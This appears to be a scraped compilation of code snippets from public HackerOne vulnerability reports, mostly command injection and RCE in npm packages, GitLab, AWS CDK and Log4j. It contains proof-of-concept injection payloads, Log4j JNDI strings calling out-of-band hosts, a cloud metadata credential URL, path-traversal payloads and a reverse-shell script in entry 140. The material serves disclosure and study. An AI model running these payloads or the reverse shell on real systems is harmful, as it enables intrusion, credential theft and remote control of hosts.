## 59. [#422944](https://hackerone.com/reports/422944)  -  H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products
*medium*

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## 60. [#422944](https://hackerone.com/reports/422944)  -  H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products
*medium*

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/████████
```

## 61. [#630227](https://hackerone.com/reports/630227)  -  Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function
*medium*

```javascript
/**
 * PM2 Module System.
 */
Modularizer.install = function (CLI, module_name, opts, cb) {
  if (typeof(opts) == 'function') {
    cb = opts;
    opts = {};
  }

  if (LOCAL.INTERNAL_MODULES.hasOwnProperty(module_name)) {
    Common.logMod(`Adding dependency ${module_name} to PM2 Runtime`);
    var currentModule = LOCAL.INTERNAL_MODULES[module_name];
    if (currentModule && currentModule.hasOwnProperty('dependencies')) {
      LOCAL.installMultipleModules(currentModule.dependencies, cb);
    } else {
      LOCAL.install(currentModule, cb);
    }
  }
  else if (module_name == '.') {
    Common.logMod(`Installing local NPM module`);
    return NPM.localStart(CLI, opts, cb)
  }
  else if (opts.tarball || module_name.indexOf('.tar.gz') > -1) {   //// vulnerable code
    Common.logMod(`Installing TAR module`);
    TAR.install(CLI, module_name, opts, cb)  //// not sanitized module_name is used as an argument here 
  }
  else {
    Common.logMod(`Installing NPM ${module_name} module`);
    NPM.install(CLI, module_name, opts, cb)
  }
};
```

## 62. [#630227](https://hackerone.com/reports/630227)  -  Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function
*medium*

```javascript
function installLocal(PM2, module_filepath, opts, cb) {
  Common.logMod(`Installing package ${module_filepath}`)

  // Get module name by unpacking the module/package.json only and read the name attribute
  getModuleName(module_filepath, function(err, module_name) {
    if (err) return cb(err)

    Common.logMod(`Module name is ${module_name}`)

    Common.logMod(`Depackaging module...`)

    var install_path = path.join(cst.DEFAULT_MODULE_PATH, module_name);

    if (fs.existsSync(install_path)) {
      deleteModulePath(module_name)
    }

    require('mkdirp').sync(install_path)

    //// here unsanitized module_filepath reaches execution sink:
    var install_instance = spawn('tar', ['zxf', module_filepath, '-C', install_path, '--strip-components 1'], {
      stdio : 'inherit',
      env: process.env,
		  shell : true
    })

    install_instance.on('close', function(code) {
      Common.logMod(`Module depackaged in ${install_path}`)
      if (code == 0)
        return runInstall(PM2, install_path, module_name, opts, cb)
      return PM2.exitCli(1)
    });

    install_instance.on('error', function (err) {
      console.error(err.stack || err);
    });
  })
}
```

## 63. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```typescript
depsCommand = chain([
    osCommand.writeJson(pathJoin(options.outputDir, 'package.json'), { dependencies }),
    osCommand.copy(lockFilePath, pathJoin(options.outputDir, this.packageManager.lockFile)),
    osCommand.changeDirectory(options.outputDir),
    this.packageManager.installCommand.join(' '),
]);
```

## 64. [#955016](https://hackerone.com/reports/955016)  -  GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
*high*

```go
// gitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go
func readConfigsFromCredentialsHelper(config *configfile.ConfigFile) (map[string]types.AuthConfig, error) {
	helpersAuths := make(map[string]types.AuthConfig)

	for registry, helper := range config.CredentialHelpers {
		store := credentials.NewNativeStore(config, helper)

		newAuths, err := store.Get(registry)
```

## 65. [#955016](https://hackerone.com/reports/955016)  -  GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
*high*

```toml
concurrent = 1
check_interval = 0

[session_server]
  session_timeout = 1800

[[runners]]
  name = "windows"
  url = "https://gitlab.com"
  token = "█████"
  executor = "docker-windows"
  [runners.custom_build_dir]
  [runners.cache]
    [runners.cache.s3]
    [runners.cache.gcs]
  [runners.docker]
    tls_verify = false
    image = "mcr.microsoft.com/windows/servercore:1809"
    privileged = false
    disable_entrypoint_overwrite = false
    oom_kill_disable = false
    disable_cache = false
    volumes = ["c:\\cache"]
    shm_size = 0
```

## 66. [#1430622](https://hackerone.com/reports/1430622)  -  [forum.acronis.com] JNDI Code Injection due an outdated log4j component
*critical*

```
${j${main:\k5:-Nd}
```

## 67. [#1430622](https://hackerone.com/reports/1430622)  -  [forum.acronis.com] JNDI Code Injection due an outdated log4j component
*critical*

```
${spring:k5:-:}
```

## 68. [#1430622](https://hackerone.com/reports/1430622)  -  [forum.acronis.com] JNDI Code Injection due an outdated log4j component
*critical*

```
${sys:user.name}
```

## 69. [#1425565](https://hackerone.com/reports/1425565)  -  Remote code injection in Log4j on  https://mymtn.mtncongo.net - CVE-2021-44228
*critical*

```
${jndi:ldap://${hostName}
```

## 70. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ domain }
```

## 71. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ Boolean(options.skipCertutilInstall) }
```

## 72. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ Boolean(options.skipHostsFile) }
```

## 73. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ process.platform }
```

## 74. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ configpath }
```

## 75. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ domainKeyPath }
```

## 76. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ csrFile }
```

## 77. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ domainCertConfigPath }
```

## 78. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ domainCertPath }
```

## 79. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ caKeyPath }
```

## 80. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ caCertPath }
```

## 81. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ filename }
```

## 82. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```
${ cmd }
```

## 83. [#858674](https://hackerone.com/reports/858674)  -  [wireguard-wrapper] Command Injection via insecure command concatenation
*critical*

```
${device}
```

## 84. [#858674](https://hackerone.com/reports/858674)  -  [wireguard-wrapper] Command Injection via insecure command concatenation
*critical*

```
${error}
```

## 85. [#858674](https://hackerone.com/reports/858674)  -  [wireguard-wrapper] Command Injection via insecure command concatenation
*critical*

```
${stderr}
```

## 86. [#315773](https://hackerone.com/reports/315773)  -  Remote Command Execution vulnerability in pullit
*critical*

```
${branch}
```

## 87. [#319467](https://hackerone.com/reports/319467)  -  `macaddress` concatenates unsanitized input into exec() command
*critical*

```
../../../etc/passwd;
```

## 88. [#871071](https://hackerone.com/reports/871071)  -  [gfc] Command Injection via insecure command formatting
*critical*

```
${message}
```

## 89. [#871071](https://hackerone.com/reports/871071)  -  [gfc] Command Injection via insecure command formatting
*critical*

```
${files}
```

## 90. [#871071](https://hackerone.com/reports/871071)  -  [gfc] Command Injection via insecure command formatting
*critical*

```
${opts.remote}
```

## 91. [#863944](https://hackerone.com/reports/863944)  -  [extra-ffmpeg] Command Injection via insecure command formatting
*critical*

```
${JSON.stringify(o[k])}
```

## 92. [#630227](https://hackerone.com/reports/630227)  -  Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function
*medium*

```
bl4de:~/playground/Node $ ./pm2 install "foo.tar.gz;echo 'HERE'"
[PM2][Module] Installing TAR module
[PM2][Module] Installing package foo.tar.gz;echo 'HERE'
tar: Error opening archive: Failed to open 'foo.tar.gz'
HERE -C /var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T module/package.json
[PM2][ERROR] ENOENT: no such file or directory, open '/var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T/module/package.json'
┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐
│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │
└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘
 Use `pm2 show <id|name>` to get more details about an app
bl4de:~/playground/Node $
```

## 93. [#630227](https://hackerone.com/reports/630227)  -  Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function
*medium*

```
bl4de:~/playground/Node $ ./pm2 start
[PM2][ERROR] File ecosystem.config.js not found
┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐
│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │
└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘
 Use `pm2 show <id|name>` to get more details about an app
bl4de:~/playground/Node $
```

## 94. [#630227](https://hackerone.com/reports/630227)  -  Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function
*medium*

```javascript
'use strict';

const module_names = [
    'foo.tar.gz',
    'some-module_name.with_special_characters_but_still-valid.tar.gz',
    'foo.tar.gz;echo "HERE"',    // sample injection at the end of the filename, after ;
    'tar.gz;whoami|ls;foo.tar.gz'   // sample injection in the middle of filename
    ];


module_names.forEach( module_name => console.log(/^[a-z_\.-]+tar\.gz$/ig.test(module_name) === true ))

/*
true
true
false
false
*/
```

## 95. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```
${filePath}
```

## 96. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```
${posixShellEscape(data)}
```

## 97. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```
${posixShellEscape(filePath)}
```

## 98. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```
${posixShellEscape(src)}
```

## 99. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```
${posixShellEscape(dest)}
```

## 100. [#955016](https://hackerone.com/reports/955016)  -  GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
*high*

```
../../../../../../../../Windows/System32/calc.exe
```

## 101. [#955016](https://hackerone.com/reports/955016)  -  GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
*high*

```
../../../../../../../../Windows/System32/calc.exe`
```

## 102. [#955016](https://hackerone.com/reports/955016)  -  GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
*high*

```
../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-c
```

## 103. [#955016](https://hackerone.com/reports/955016)  -  GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
*high*

```
../../../../../../../../Windows/System32/calc.exe\
```

## 104. [#3558713](https://hackerone.com/reports/3558713)  -  Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`
*high*

```
${relativeEntryPath}
```

## 105. [#3558713](https://hackerone.com/reports/3558713)  -  Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`
*high*

```
${this.props.target ?? toTarget(scope, this.props.runtime)}
```

## 106. [#3558713](https://hackerone.com/reports/3558713)  -  Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`
*high*

```
${external}
```

## 107. [#3558713](https://hackerone.com/reports/3558713)  -  Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`
*high*

```
${JSON.stringify(value)}
```

## 108. [#3558713](https://hackerone.com/reports/3558713)  -  Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`
*high*

```
${JSON.stringify(...)}
```

## 109. [#1492896](https://hackerone.com/reports/1492896)  -  CVE-2022-24288: Apache Airflow: TWO RCEs in example DAGs
*high*

```json
{{params. Foo}}
```

## 110. [#1492896](https://hackerone.com/reports/1492896)  -  CVE-2022-24288: Apache Airflow: TWO RCEs in example DAGs
*high*

```json
{{params.my_param}}
```

## 111. [#1671140](https://hackerone.com/reports/1671140)  -  CVE-2022-38362: Apache Airflow Docker Provider <3.0 RCE vulnerability in example dag
*high*

```json
{{params.source_location}}
```

## 112. [#881713](https://hackerone.com/reports/881713)  -  [last-commit-log] Command Injection
*high*

```
${GIT_DIR}
```

## 113. [#1679624](https://hackerone.com/reports/1679624)  -  Remote Command Execution via Github import
*critical, $33,510*

```ruby
i = i.to_s
            command << "$#{i.bytesize}"
            command << i
```

## 114. [#1679624](https://hackerone.com/reports/1679624)  -  Remote Command Execution via Github import
*critical, $33,510*

```ruby
define_method("#{name}_include?") do |value|
          ivar = "@#{name}_include"
          memoized = instance_variable_get(ivar) || {}
          lookup = proc { __send__(name).include?(value) } # rubocop:disable GitlabSecurity/PublicSend

          next memoized[value] if memoized.key?(value)

          memoized[value] =
            if strong_memoized?(name)
              lookup.call
            else
              result, exists = redis_set_cache.try_include?(name, value)

              exists ? result : lookup.call
            end

          instance_variable_set(ivar, memoized)[value]
        end
```

## 115. [#1609965](https://hackerone.com/reports/1609965)  -  RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)
*critical, $33,510*

```ruby
def execute
     if create_from_template?
        return ::Projects::CreateFromTemplateService.new(current_user, params).execute
      end
    # ...
    end

    def create_from_template?
      @params[:template_name].present? || @params[:template_project_id].present?
    end
```

## 116. [#2778350](https://hackerone.com/reports/2778350)  -  Cisco IOS XE instance at ████ vulnerable to CVE-██████
*critical*

```bash
exploit.py -t █████ -g

Selected Target:        ██████
Running in Exec Mode
Executing Command:      sh run

Sending exploit to target URL:  █████

Building configuration...
Current configuration : 17326 bytes
```

## 117. [#1425565](https://hackerone.com/reports/1425565)  -  Remote code injection in Log4j on  https://mymtn.mtncongo.net - CVE-2021-44228
*critical*

```json
[2021-12-14 03:38:05] [CVE-2021-44228] [http] [critical] https://mymtn.mtncongo.net:8443/?x=${jndi:ldap://${hostName}.c6s11oscca8f9pc2lrggcghbdgeyyyd66.interact.sh/a} [net]
```

## 118. [#1425563](https://hackerone.com/reports/1425563)  -  Remote code injection in Log4j on http://mtn1app.mtncameroon.net  - CVE-2021-44228
*critical*

```
http://mtn1app.mtncameroon.net:8080/?x=${jndi:ldap://${hostName}.c6s11oscca8f9pc2lrggcghbnjyyyybjg.interact.sh/a} [lastic-co1-nodes1.mtnnigeria.net]
```

## 119. [#394294](https://hackerone.com/reports/394294)  -  [samsung-remote] Command injection
*critical*

```
var remote = new SamsungRemote({
    ip: '127.0.0.1; touch /tmp/malicious;' 
});

remote.isAlive(function(err) {});
```

## 120. [#685447](https://hackerone.com/reports/685447)  -  gitlabhook OS Command Injection
*critical*

```
chmod 755 exploit.py
pip3 install requests
python3 exploit.py
```

## 121. [#858674](https://hackerone.com/reports/858674)  -  [wireguard-wrapper] Command Injection via insecure command concatenation
*critical*

```javascript
const { Wg } = require('wireguard-wrapper');

Wg.showconf('; touch HACKED').then(function(config){
    console.log('wg0 configuration:', config);
    console.log('generated configuration file:', config.toString());
});
```

## 122. [#319467](https://hackerone.com/reports/319467)  -  `macaddress` concatenates unsanitized input into exec() command
*critical*

```
lib/linux.js:4:    exec("cat /sys/class/net/" + iface + "/address", function (err, out) {
lib/macosx.js:4:    exec("networksetup -getmacaddress " + iface, function (err, out) {
lib/unix.js:4:    exec("ifconfig " + iface, function (err, out) {
```

## 123. [#331032](https://hackerone.com/reports/331032)  -  [buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag
*critical*

```javascript
// ./node_modules/buttle/lib/mid-php.js, line 15

    var phpFile = norm(join(docroot, req.url));
    fs.exists(phpFile, function(exists) {
    if(exists) {
        res.setHeader('Content-Type', 'text/html');

        var cp = require('child_process').spawn(phpBin, [phpFile]);

        cp.stdout.on('data', function(data) {
        res.write(data);
        });

        cp.stderr.on('data', function(data) {
        res.write(data);
        });

        cp.on('close', function() {
        res.end('');
        });

    } else {
```

## 124. [#871071](https://hackerone.com/reports/871071)  -  [gfc] Command Injection via insecure command formatting
*critical*

```javascript
const firstCommit = require('gfc');
const options = {message: '""; touch HACKED;'};
firstCommit('.', options, function(err) {});
```

## 125. [#925324](https://hackerone.com/reports/925324)  -  [systeminformation] Command Injection via insecure command formatting
*critical*

```javascript
const si = require('systeminformation')
const HOST = "127.0.0.1:443"

//The telnet was chosen to solve an issue with the protocol response check, like HTTP (HTTP/1.0 200 OK in the first line).
si.inetChecksite(`telnet://${HOST} --no-buffer -o node_modules/systeminformation/lib/internet.js`)

setTimeout(() => {
  process.exit()
}, 2000)
```

## 126. [#863956](https://hackerone.com/reports/863956)  -  [extra-asciinema] Command Injection via insecure command formatting
*critical*

```javascript
// https://github.com/nodef/extra-asciinema/blob/master/index.js#L214
...
const cp9 = require('child_process');
...
/**
 * Upload recorded asciicast to asciinema.org site.
 * @param {string} f filename
 * @returns {string} asciicast URL
 */
function uploadSync(f) {
  var stdout = cp9.execSync(`asciinema upload ${f}`, {encoding: 'utf8'});
  return stdout.replace(/.*?(https?:\S+).*/s, '$1');
}
...
```

## 127. [#864777](https://hackerone.com/reports/864777)  -  [vboxmanage.js] Command Injection via insecure command concatenation
*critical*

```javascript
var VBox = require('vboxmanage.js');
VBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});
```

## 128. [#951249](https://hackerone.com/reports/951249)  -  [freespace] Command Injection due to Lack of Sanitization
*medium*

```
${driveOrMount}
```

## 129. [#630227](https://hackerone.com/reports/630227)  -  Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function
*medium*

```
${module_name}
```

## 130. [#630227](https://hackerone.com/reports/630227)  -  Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function
*medium*

```
${module_filepath}
```

## 131. [#630227](https://hackerone.com/reports/630227)  -  Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function
*medium*

```
${install_path}
```

## 132. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```typescript
public write(filePath: string, data: string): string {
    // ...
    return `echo '${data}' > "${filePath}"`;
    //           ^ NO ESCAPING  -  single quotes in data break out
}
```

## 133. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```javascript
// lambda/handler.js
exports.handler = async function() { return "OK"; }
```

## 134. [#955016](https://hackerone.com/reports/955016)  -  GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
*high*

```json
{
  "helper" : "/../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-cde2929a41401004cf47d36bdb2eb380/_data/testfile.exe"
}
```

## 135. [#955016](https://hackerone.com/reports/955016)  -  GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
*high*

```yml
services:
  - alpasdfasdfasdfasdfasdfidne:3.5
variables:
  DOCKER_AUTH_CONFIG: "{\"credHelpers\" : {\"repo.example.com\" : \"/../../../../../../../../Windows/System32/calc.exe\"}}"

build1:
  tags:
    - windows-docker-runner
  stage: build
  script:
    - whoami
```

## 136. [#3558713](https://hackerone.com/reports/3558713)  -  Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`
*high*

```typescript
// bundling.ts, lines 245-266
const esbuildCommand: string[] = [
  options.esbuildRunner,
  '--bundle', `"${relativeEntryPath}"`,
  `--target=${this.props.target ?? toTarget(scope, this.props.runtime)}`,
  '--platform=node',
  // ...
  ...this.externals.map(external => `--external:${external}`),         // LINE 255  -  NO ESCAPING
  ...loaders.map(([ext, name]) => `--loader:${ext}=${name}`),          // LINE 256  -  NO ESCAPING
  ...defines.map(([key, value]) => `--define:${key}=${JSON.stringify(value)}`), // LINE 257  -  key NOT ESCAPED
  // ...
  ...this.props.inject ? this.props.inject.map(i => `--inject:"${i}"`) : [],   // LINE 265  -  NO ESCAPING
  ...this.props.esbuildArgs ? [toCliArgs(this.props.esbuildArgs)] : [],         // LINE 266  -  NO ESCAPING
];
```

## 137. [#330957](https://hackerone.com/reports/330957)  -  [pdfinfojs] Command Injection on filename parameter
*high*

```javascript
var pdfinfo = require('pdfinfojs'),
    pdf = new pdfinfo('$({touch,a})'); // Malicious payload

pdf.getInfo(function(err, info, params) {
  if (err) {
    console.error(err.stack);
  }
  else {
    console.log(info); //info is an object
    console.log(params); // commandline params passed to pdfinfo cmd
  }
});
```

## 138. [#341869](https://hackerone.com/reports/341869)  -  [entitlements] Command injection on the 'path' parameter
*high*

```javascript
var entitlements = require('entitlements');

entitlements(';touch a', function(error, data){
  console.log(data);
});
```

## 139. [#658013](https://hackerone.com/reports/658013)  -  Git flag injection - local file overwrite to remote code execution
*critical, $12,000*

```bash
$ sudo gitlab-rake gitlab:env:info

System information
System:		Ubuntu 16.04
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.1.0
Revision:	295480f4553
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## 140. [#784714](https://hackerone.com/reports/784714)  -  Relative Path Vulnerability Results in Arbitrary Command Execution/Privilege Escalation
*medium, $750*

```
#!/bin/bash
bash -i >& /dev/tcp/LISTENER_IP_ADDRESS/443 0>&1 &
DEVICE=$1
CIDER=$2
IP=$3
/sbin/ifconfig $1 $2 $3

4. Make the script executable by running `chmod +x /tmp/ifconfig`

5. Run the Nebula client with the command `sudo ./nebula -config config.yml`. When the ifconfig command is called, it will execute the reverse shell command in the script and then continue connecting.

6. On the host in step 1, a reverse Bash shell connects. Run the command "whoami" (or id) and "hostname" and verify the user is now root, and the hostname is the hostname of the MacOS computer in step 2.

Note: To perform this attack on Windows, a custom binary would need to be compiled and named "netsh" but the principles are the same on each OS. 

###Resolution###
Modify the paths on the affected lines to absolute paths. For example, line 45 of nebula/tun_darwin.go reads:
```

## 141. [#690010](https://hackerone.com/reports/690010)  -  OS Command Injection on Jison [all-parser-ports]
*medium*

```
console.log("Executing: " + "jison " + process.argv[2]);

exec("jison " + process.argv[2], function (error) {
    if (error) {
        console.log(error);
        return;
    }
```

## 142. [#390865](https://hackerone.com/reports/390865)  -  Command Injection Vulnerability in libnmap Package
*medium*

```js
const nmap = require('libnmap');
const opts = {
    range: [
        'scanme.nmap.org',
        "x.x.$(touch success.txt)"
    ]
};
nmap.scan(opts, function(err, report) {
    if (err) throw new Error(err);

    for (let item in report) {
        console.log(JSON.stringify(report[item]));
    }
});
```

## 143. [#390848](https://hackerone.com/reports/390848)  -  Command Injection is ps Package
*medium*

```js
var ps = require('ps');

ps.lookup({ pid: "$(touch success.txt)" }, function(err, proc) { // this method is vulnerable to command injection
    if (err) {throw err;}
    if (proc) {
        console.log(proc);  // Process name, something like "node" or "bash"
    } else {
        console.log('No such process');
    }
});
```

## 144. [#1161691](https://hackerone.com/reports/1161691)  -  OS Command Injection in 'rdoc' documentation generator
*medium*

```ruby
def remove_unparseable files
    files.reject do |file, *|
      file =~ /\.(?:class|eps|erb|scpt\.txt|svg|ttf|yml)$/i or
        (file =~ /tags$/i and
         open(file, 'rb') { |io|
           io.read(100) =~ /\A(\f\n[^,]+,\d+$|!_TAG_)/
         })
    end
  end
```

## 145. [#950192](https://hackerone.com/reports/950192)  -  [@knutkirkhorn/free-space] - Command Injection through Lack of Sanitization
*medium*

```javascript
'use strict';
const {exec} = require('child_process');

module.exports = disk => {
    return new Promise((resolve, reject) => {
        exec(`df -k | grep ^${disk} | awk '{print $4}'`, (err, stdout, stderr) => { // 'disk' is the parameter passed here from the library's exported call
            if (stderr) {
                reject(new Error('Something wrong happened'));
                return;
            }

            if (stdout.length === 0 || err) {
                reject(new Error('Could not find disk: ' + disk));
            }

            resolve(parseInt(stdout, 10) * 1024);
        });
    });
};
```

## 146. [#633364](https://hackerone.com/reports/633364)  -  Command Injection in npm module name passed as an argument to pm2.install() function
*medium*

```javascript
function install(CLI, module_name, opts, cb) {
  moduleExistInLocalDB(CLI, module_name, function (exists) {
    if (exists) {
      Common.logMod('Module already installed. Updating.');

      Rollback.backup(module_name);

      return uninstall(CLI, module_name, function () {
        return continueInstall(CLI, module_name, opts, cb);
      });
    }
    return continueInstall(CLI, module_name, opts, cb);  //// injection point
  })
}
```

## 147. [#633364](https://hackerone.com/reports/633364)  -  Command Injection in npm module name passed as an argument to pm2.install() function
*medium*

```javascript
function continueInstall(CLI, module_name, opts, cb) {
  Common.printOut(cst.PREFIX_MSG_MOD + 'Calling ' + chalk.bold.red('[NPM]') + ' to install ' + module_name + ' ...');

  var canonic_module_name = Utility.getCanonicModuleName(module_name);
  var install_path = path.join(cst.DEFAULT_MODULE_PATH, canonic_module_name);

  require('mkdirp')(install_path, function() {
    process.chdir(os.homedir());

    var install_instance = spawn(cst.IS_WINDOWS ? 'npm.cmd' : 'npm', ['install', module_name, '--loglevel=error', '--prefix', '"'+install_path+'"' ], {
      stdio : 'inherit',
      env: process.env,
		  shell : true
    });

(...)
```

## 148. [#733072](https://hackerone.com/reports/733072)  -  Path traversal, to RCE
*high, $12,000*

```bash
$ gitlab-rake gitlab:env:info

System information
System:		
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.2-ee
Revision:	a3170599aa2
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://10.26.0.5
HTTP Clone URL:	http://10.26.0.5/some-group/some-project.git
SSH Clone URL:	git@10.26.0.5:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## 149. [#1679624](https://hackerone.com/reports/1679624)  -  Remote Command Execution via Github import
*critical, $33,510*

```ruby
def self.attr_accessor(*attrs)
      attrs.each do |attribute|
        class_eval do
          define_method attribute do
            @attrs[attribute.to_sym]
          end

          define_method "#{attribute}=" do |value|
            @attrs[attribute.to_sym] = value
          end

          define_method "#{attribute}?" do
            !!@attrs[attribute.to_sym]
          end
        end
      end
    end
```

## 150. [#1679624](https://hackerone.com/reports/1679624)  -  Remote Command Execution via Github import
*critical, $33,510*

```ruby
def import_repository
          project.ensure_repository

          refmap = Gitlab::GithubImport.refmap
          project.repository.fetch_as_mirror(project.import_url, refmap: refmap, forced: true)

          project.change_head(default_branch) if default_branch

          # The initial fetch can bring in lots of loose refs and objects.
          # Running a `git gc` will make importing pull requests faster.
          Repositories::HousekeepingService.new(project, :gc).execute

          true
        end
```

## 151. [#1609965](https://hackerone.com/reports/1609965)  -  RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)
*critical, $33,510*

```ruby
def command
        "gzip -dc #{@archive_path} | wc -c"
      end

   def validate
        pgrp = nil
        valid_archive = true

        Timeout.timeout(TIMEOUT_LIMIT) do
          stdin, stdout, stderr, wait_thr = Open3.popen3(command, pgroup: true)
          stdin.close
```

## 152. [#1609965](https://hackerone.com/reports/1609965)  -  RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)
*critical, $33,510*

```ruby
def prepare_import_params
      data = {}
      data[:override_params] = @override_params if @override_params

      if overwrite_project?
        data[:original_path] = params[:path]
        params[:path] += "-#{tmp_filename}"
      end

      if template_file
        data[:sample_data] = params.delete(:sample_data) if params.key?(:sample_data)
        params[:import_type] = 'gitlab_project'
      end

      params[:import_data] = { data: data } if data.present?
    end
```

## 153. [#587854](https://hackerone.com/reports/587854)  -  Local files could be overwritten in GitLab, leading to remote command execution
*critical, $12,000*

```shell
$ tree
.
└── --output=
    └── var
        └── opt
            └── gitlab
                └── .ssh
                    └── authorized_keys
                        └── id_ed25519.pub
```

## 154. [#587854](https://hackerone.com/reports/587854)  -  Local files could be overwritten in GitLab, leading to remote command execution
*critical, $12,000*

